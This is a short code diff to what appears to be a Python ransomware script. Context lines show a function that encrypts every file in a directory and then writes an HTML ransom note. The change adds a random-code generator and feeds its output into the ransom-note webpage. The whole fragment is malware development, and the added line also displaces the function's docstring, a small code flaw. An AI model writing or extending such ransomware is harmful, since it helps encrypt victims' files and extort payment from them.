@@ -69,7 +69,16 @@ def encrypt_directory(directory: str, password: str):
             encrypt_file(file_path, password)
         create_ransom_note_webpage(directory)
 
+
+    # Generate a random encryption code (for demonstration purposes)
+def generate_token(length=24):
+    import secrets, string
+    alphabet = string.ascii_uppercase + string.digits
+    return ''.join(secrets.choice(alphabet) for _ in range(length))
+
+
 def create_ransom_note_webpage(directory: str):
+    randomly_generated_code = generate_token()
     """Create a ransom note webpage in the given directory."""
     ransom_note_content = """
     <html>
@@ -81,6 +90,4 @@ def create_ransom_note_webpage(directory: str):
     </body>
     </html>
     """
-    # Generate a random encryption code (for demonstration purposes)
-       
 
